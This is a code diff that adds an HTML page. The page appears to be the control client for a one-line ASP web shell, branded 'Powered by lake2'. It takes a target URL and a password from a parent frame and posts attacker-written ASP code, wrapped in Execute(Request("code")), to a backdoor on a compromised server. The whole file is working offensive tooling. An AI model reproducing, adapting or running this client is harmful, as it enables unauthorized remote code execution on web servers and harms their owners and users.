@@ -1,0 +1,16 @@
+<link rel="stylesheet" type="text/css" href="lake2.css">
+<div align="center">My Code</div>
+<form name="xform" method="post" target="_blank">
+  <textarea name="code" cols="80" rows="20">response.write(now()&"<br>")
+response.write("This is your code<br>")
+response.write("Powered by lake2")
+response.end</textarea>
+  <input type="hidden" name="china" value='Execute(&quot;Execute(Request(&quot;&quot;code&quot;&quot;))&quot;)'>
+</form>
+<script>
+function RUNonclick(){
+document.xform.china.name = parent.pwd.value;
+document.xform.action = parent.url.value;
+document.xform.submit();
+}
+</script>
